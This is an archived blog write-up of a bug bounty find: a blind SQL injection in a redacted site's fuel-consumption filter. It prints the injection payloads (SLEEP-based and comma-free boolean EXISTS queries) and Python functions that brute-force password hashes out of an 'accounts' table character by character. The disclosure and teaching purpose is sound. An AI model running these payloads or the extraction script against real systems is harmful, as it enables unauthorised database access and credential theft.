# ️‍♂️ How to Hunt a Perfect 10.0 CVSS Bug Bounty Score (And You Can Too!)

- **Source URL:** https://medium.com/@nocley/how-to-hunt-a-perfect-10-0-cvss-bug-bounty-score-sqli-4555cf03c399?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250905094516/https://medium.com/@nocley/how-to-hunt-a-perfect-10-0-cvss-bug-bounty-score-sqli-4555cf03c399?source=rss------bug_bounty-5
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/9716 (id 9716)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# 🕵️♂️💻 How to Hunt a Perfect 10.0 CVSS Bug Bounty Score (And You Can Too!) 🚀

Imagine you’re a treasure hunter, scouring a digital jungle for a hidden gem — a flaw in a website that could earn you fame, glory, and a hefty bounty. That’s exactly what my friend **ngosytuan** and I set out to do when we targeted a site called `sub.redacted.com`. Our mission? Uncover a rare and dangerous bug called an **SQL Injection** (SQLi), a vulnerability so severe it’s like finding a master key to a bank vault.

**Spoiler alert:** we didn’t just find it—we scored a **perfect 10.0 CVSS**, the bug bounty equivalent of an Olympic gold medal. Here’s how we did it, with tips to help you start your own hunt.

## 🗺️ Chapter 1: The Quest Begins

Our adventure started with a bold goal: find an SQL Injection on a tricky website. The target was like a fortress, with a complex system passing a *ton* of parameters (think of them as puzzle pieces) to a backend server. If there was a vulnerability hiding in there, it was buried deep, like a needle in a haystack. But **ngosytuan** and I were ready to dig.

## 🛠️ Chapter 2: The Game-Changing Hack

Early on, **ngosytuan** dropped a piece of wisdom that felt like a cheat code: *“Got too many parameters to test? Don’t poke each one with a single quote '—just throw quotes at everything and peel them back one by one.”*

It sounded like chaos, but it was genius. Imagine trying to find a leaky pipe by turning on every faucet at once, then shutting them off one by one to spot the drip. That’s what we did. We crafted a request, injected single quotes `'` into *all* the parameters, and fired it at the server.

**BAM!** The server choked and spat out a **500 Internal Server Error**. We had a clue — our first sign of buried treasure.

## 🧩 Chapter 3: The Puzzle Gets Trickier

Confirming the SQL Injection was like solving a riddle wrapped in a mystery. After identifying the correct param that is failing, we start with the UNION payload.

The server threw us a cryptic error message:

`CAST(REPLACE(fuel_consumption_mixed, ',', '.') AS DECIMAL(5,2)) BETWEEN 1 AND 1=1 UNION SELECT 1.2.3--`
At first, we thought, “Aha! Two columns!” But something was off. The error wasn’t about bad SQL — it was about *data conversion*. The backend was swapping every comma (`,`) for a period (`.`) and trying to treat the result as a decimal number. So, when we sent `1.2.3`, it got confused, like trying to read “1.2.3” as a single number. No wonder it broke!

We exploit with **sqlmap** to dump data, a popular tool for testing SQL Injections, but it kept striking out. Frustration was setting in.

## 💡 Chapter 4: The Midnight Breakthrough

After a long night, I decided to try one last trick before calling it quits. I sent a payload with a **SLEEP(10)** command, like telling the server, “Hey, take a 10-second nap if you’re vulnerable.” The payload looked like this:

`1 AND 1=1 UNION SELECT SLEEP(10)--`
I hit send and waited. My heart raced as the seconds ticked by… and then, *exactly 10 seconds later*, the server responded. I tried again with `SLEEP(5)`, and sure enough, it paused for 5 seconds.

Jackpot! We had a **confirmed SQL Injection**, and it was a big one. This wasn’t just a crack in the wall — it was a gaping hole.

## 🖥️ Chapter 5: Outsmarting the System

To seal the deal, I needed to understand why our earlier tests failed. The backend’s comma-to-period swap was tripping us up. Tools like sqlmap couldn’t handle the server’s weird data conversion, so I took matters into my own hands. I wrote a custom auto-exploit script that:

- Sent boolean-base payloads to test the injection.
- Check response’s length to confirm.
- Extract data.

Think of it like building a custom metal detector to find that one specific coin in the sand. It wasn’t fancy, but it worked like a charm.

**Payload:**

`1 AND EXISTS(SELECT 1 FROM dual WHERE LENGTH((SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema = 'db' AND table_name = 'accounts'))`
**No more ,**

And I code an exploit code for this case like this:

- Check data length:

```
def get_data_length():
    """Binary find to check length"""
    left, right = 1, 100
    while left <= right:
        mid = (left + right) // 2
        payload = f"1 AND EXISTS(SELECT 1 FROM dual WHERE LENGTH((SELECT GROUP_CONCAT(password) FROM accounts LIMIT 1)) > {mid})"
        json_data = {"filters": {"fuel_consumption": [1, payload]}}
        r = requests.post(url, headers=headers, cookies=cookies, json=json_data)
        if "id=1207" in r.text:
            left = mid + 1
        else:
            right = mid - 1
    return right + 1
```
- Check character:

```
def test_character(position, char):
    payload = f"1 AND EXISTS(SELECT 1 FROM dual WHERE SUBSTRING((SELECT GROUP_CONCAT(password) FROM accounts LIMIT 1) FROM {position} FOR 1) = '{char}')"
    json_data = {"filters": {"fuel_consumption": [1, payload]}}
    try:
        r = requests.post(url, headers=headers, cookies=cookies, json=json_data)
        if "id=1337" in r.text:
            return char
    except:
        pass
    return None
```
- Extract database:


def extract_data():

"""Brute-force"""

result = ""

length = get_data_length()

print(f"[+] Target data length: {length}")


with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:

for i in range(1, length + 1):

futures = {executor.submit(test_character, i, c): c for c in charset}

for future in concurrent.futures.as_completed(futures):

found = future.result()

if found:

result += found

print(f"[+] Found char at pos {i}: {found}")

break

return result

## Get the hidden gem 🌟

## 🏆 Chapter 6: Victory and Validation

With our proof-of-concept (PoC) and script in hand, I submitted the report to the bug bounty program. The triage team reviewed it quickly, and soon after, the company marked it **Accepted** with a **High severity** rating. We had done it — our SQL Injection was officially a **10.0 CVSS** masterpiece. Mission accomplished! 🎉

## 📋 Bug Bounty Bootcamp: Tips to Start Your Hunt

Want to chase your own digital treasures? Here’s what I learned from this adventure:

- 🔍 **Read error messages like a detective.** They’re clues, not just noise. A single line can point you to the bug.
- 🧠 **Think like the backend.** Understand how the server processes data (like swapping commas for periods) to craft smarter attacks.
- 🛠️ **Build your own tools.** If off-the-shelf tools like sqlmap fail, a custom script can save the day and make your report stand out.
- 🎣 **Test everything at once, then narrow down.** Injecting quotes into all parameters is like casting a wide net — then reel in the catch slowly.
- 💪 **Stay curious and persistent.** Bug hunting is a marathon, not a sprint. Keep tweaking, testing, and learning.

## 🌟 Why This Matters

Scoring a 10.0 CVSS isn’t just about bragging rights (though it feels *awesome*). It’s about making the internet safer, learning how systems work, and maybe earning a nice payout along the way. Whether you’re a coder, a curious newbie, or just love a good challenge, bug bounty hunting is a thrilling way to test your skills.

So, grab your laptop, team up with a friend, and start exploring. Your own 10.0 adventure might be just one clever payload away. Happy hunting! 🚀

Cheers to many more finds ahead!

Before you go:

Be sure to clap and follow us👏

fatman & ngosytuan

nocley Team
